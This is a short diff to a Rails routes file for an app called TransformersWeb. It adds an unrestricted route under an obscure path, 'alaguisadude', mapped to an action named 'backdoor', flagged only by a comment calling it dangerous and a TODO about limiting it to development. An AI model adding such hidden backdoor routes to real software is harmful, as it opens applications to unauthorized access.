@@ -14,6 +14,11 @@ TransformersWeb::Application.routes.draw do
   match 'edit'    => 'main#edit'
   match 'designs' => 'main#list'
   
+  # Dangerous controller route. 
+  # TODO: allow only in development??
+  match 'alaguisadude' => 'application#backdoor'
+
+  
   # grid controllers
   match 'grids/update' => 'grids#generate_markup', :via => :post
   
